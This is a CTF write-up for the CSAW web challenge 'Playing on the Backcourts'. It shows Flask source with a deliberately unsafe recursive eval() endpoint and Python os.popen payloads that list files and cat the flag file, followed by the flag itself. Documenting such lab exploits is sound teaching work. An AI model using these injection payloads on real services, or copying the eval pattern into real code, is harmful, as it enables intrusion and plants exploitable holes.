# Playing on the Backcourts
## Description
> yadayada playing tennis like pong yadayada someone's cheating yadayada at least the leaderboard is safe!
> 
> author: smallfoot
> 
> https://backcourts.ctf.csaw.io
## Challenge Overview
![image](https://github.com/user-attachments/assets/29346638-d5ce-400f-b59b-8f368e1cd3a0)
<details> 
  <summary>Source code app.py</summary>
  
```py
from flask import Flask, render_template, request, session, jsonify, send_file
from hashlib import sha256
from os import path as path

app = Flask(__name__)
app.secret_key = 'safe'

leaderboard_path = 'leaderboard.txt'
safetytime = 'csawctf{i_look_different_in_prod}'

@app.route('/')
def index() -> str:
    cookie = request.cookies.get('session')
    
    if cookie:
        token = cookie.encode('utf-8')
        tokenHash = sha256(token).hexdigest()
        
        if tokenHash == '25971dadcb50db2303d6a68de14ae4f2d7eb8449ef9b3818bd3fafd052735f3b':
            try:
                with open(leaderboard_path, 'r') as file:
                    lbdata = file.read()
            
            except FileNotFoundError:
                lbdata = 'Leaderboard file not found'
            
            except Exception as e:
                lbdata = f'Error: {str(e)}'
                
            return '<br>'.join(lbdata.split('\n'))
    
    open('logs.txt', mode='w').close()
    return render_template("index.html")


@app.route('/report')
def report() -> str:
    return render_template("report.html")


@app.route('/clear_logs', methods=['POST'])
def clear_logs() -> Flask.response_class:
    try:
        open('logs.txt', 'w').close()
        
        return jsonify(status='success')
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))

    
@app.route('/submit_logs', methods=['POST'])
def submit_logs() -> Flask.response_class:
    try:
        logs = request.json
        
        with open('logs.txt', 'a') as logFile:
            for log in logs:
                logFile.write(f"{log['player']} pressed {log['key']}\n")
        
        return jsonify(status='success')
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))


@app.route('/get_logs', methods=['GET'])
def get_logs() -> Flask.response_class:
    try:
        if path.exists('logs.txt'):
            return send_file('logs.txt', as_attachment=False)
        else:
            return jsonify(status='error', reason='Log file not found'), 404
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))


@app.route('/get_moves', methods=['POST'])
def eval_moves() -> Flask.response_class:
    try:
        data = request.json
        reported_player = data['playerName']
        moves = ''
        if path.exists('logs.txt'):
            with open('logs.txt', 'r') as file:
                lines = file.readlines()
                
                for line in lines:
                    if line.strip():
                        player, key = line.split(' pressed ')
                        if player.strip() == reported_player:
                            moves += key.strip()
        
        return jsonify(status='success', result=moves)
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))


@app.route('/get_eval', methods=['POST'])
def get_eval() -> Flask.response_class:
    try:
        data = request.json
        expr = data['expr']
        
        return jsonify(status='success', result=deep_eval(expr))
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))


def deep_eval(expr:str) -> str:
    try:
        nexpr = eval(expr)
    except Exception as e:
        return expr
    
    return deep_eval(nexpr)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

</details>

### Explanation

There are several endpoints in the flask code but most of them are just for the tennis game and moves logging purposes. `/get_eval` allows us to use `eval` which is a sign for `RCE (Remote Code Execution)`.


`/`

- Checks for a session cookie.
- If present and the hash matches, reads and displays `leaderboard.txt`.
- If the cookie is absent or the hash doesn’t match, clears `logs.txt` and renders `index.html`.

`/get_eval`

- Accepts POST requests with JSON data containing expr.
- Evaluates the expression using `deep_eval` and returns the result in a JSON response.

`deep_eval`

- Uses eval to evaluate the expression.
- Recursively evaluates the result until no further evaluation is possible or an exception occurs, returning the result or the original expression.

### How `eval` Works

The `eval` function in Python is used to evaluate a string expression as a Python expression. It takes a string containing a Python expression and executes it, returning the result.

```py
expr = "10 * 5"
result = eval(expr)  # result is 50
```
Other than solving arithmetic, `eval` can be used to allows the execution of arbitrary code. 

```python
expr = "__import__('os').system('ls')"
result = eval(expr)
```
In this case, the eval function executes a command that lists directory contents, which is a potential security risk if user input is not properly sanitized.

## Solution
We can try to execute simple `ls` command to `/get_eval` in Burpsuite. 

![image](https://github.com/user-attachments/assets/229dcee5-aa45-414e-b20f-686ad04c829a)

Hmmm, why the command didnt work? 

When you run `__import__('os').system('ls')`, the function returns `0` because `os.system()` returns **the exit status of the executed command**, not the output of the command itself. `0` means the command ran successfully without error. 

If you want to capture the output of the command rather than its exit status, you can use `os.popen()` or `subprocess` instead of `os.system()`

```python
output = __import__('os').popen('ls').read()
print(output)  # This will contain the directory listing.
```

After sending it to server, we get the directory listing. There are common files for web CTF that using Flask such as `Dockerfile`, `app.py`, `static` and `template`. 

![image](https://github.com/user-attachments/assets/a3447791-ea69-45c0-ad96-05c652cc4c82)

`leaderboard.txt` looks interesting, so we can try to read it. Just change `ls` to `cat leaderboard.txt`.  

![image](https://github.com/user-attachments/assets/8bc7b79a-e507-4704-9d8a-9f292c106c7e)

We get the flag in the `leaderboard.txt`.

## Flag
```
csawctf{5H1774K3_Mu5Hr00M5_1_fuX0R3d_Up_50n_0F_4_81207CH}
```

